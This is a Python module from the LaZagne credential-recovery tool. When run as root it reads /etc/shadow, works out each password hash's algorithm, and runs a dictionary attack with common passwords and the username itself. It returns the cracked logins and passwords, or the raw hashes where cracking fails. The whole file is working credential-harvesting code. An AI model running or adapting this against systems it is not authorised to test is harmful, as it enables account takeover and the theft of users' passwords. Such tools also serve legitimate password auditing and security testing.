#!/usr/bin/env python
# -*- coding: utf-8 -*- 
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.dico import get_dico
from lazagne.config.constant import *
from itertools import product
import crypt
import sys
import os

class Shadow(ModuleInfo): 

	def __init__(self):
		ModuleInfo.__init__(self, 'shadow', 'sysadmin')	

	def dictionary_attack(self, user, cryptPwd):
		dic = get_dico() 	# By default 500 most famous passwords are used for the dictionary attack 
		dic.insert(0, user) # Add the user on the list to found weak password (login equal password)
		
		# Different possible hash type	
		# ID  | Method
		# --------------------------------------------------------------------------
		# 1   | MD5
		# 2   | Blowfish (not in mainline glibc; added in some Linux distributions)
		# 5   | SHA-256 (since glibc 2.7)
		# 6   | SHA-512 (since glibc 2.7)
		
		hash_type 	= cryptPwd.split("$")[1]
		hash_algo 	= {
			'1' : 'MD5',
			'2' : 'Blowfish',
			'5' : 'SHA-256',
			'6' : 'SHA-512', 	# Used by all modern computers
		}

		# For Debug information
		for h_type in hash_algo:
			if h_type == hash_type:
				print_debug('DEBUG', '[+] Hash type {algo} detected ...'.format(algo=hash_algo[h_type]))

		salt 		= cryptPwd.split("$")[2]
		realSalt 	= '${hash_type}${salt}$'.format(hash_type=hash_type, salt=cryptPwd.split("$")[2])
		
		# -------------------------- Dictionary attack --------------------------
		print_debug('INFO', 'Dictionary Attack on the hash !!! ')
		try:
			for word in dic:
				try:
					cryptWord = crypt.crypt(word, realSalt)
					if cryptWord == cryptPwd:
						return {
							'Login'		: user,
							'Password'	: word
						}
				except Exception as e:
					pass

		except (KeyboardInterrupt, SystemExit):
			print_debug('DEBUG', u'Dictionary attack interrupted')
		
		return False

	def run(self, software_name=None):
		# Need admin privilege
		if os.getuid() == 0:
			pwdFound = []
			with open('/etc/shadow', 'r') as shadow_file:
				for line in shadow_file.readlines():
					user_hash 	= line.replace('\n', '')
					line 		= user_hash.split(':')

					# Check if a password is defined
					if not line[1] in [ 'x', '*','!' ]:
						user 		= line[0]
						cryptPwd 	= line[1]
						
						# Try dictionary attack
						result = self.dictionary_attack(user, cryptPwd)
						if result:
							pwdFound.append(result)
						
						else:
							# No cleartext password found - save hash
							pwdFound.append(
								{
									'Hash' 		: ':'.join(user_hash.split(':')[1:]), 
									'Login'		: user_hash.split(':')[0].replace('\n', '')
								}
							)
				
				return pwdFound
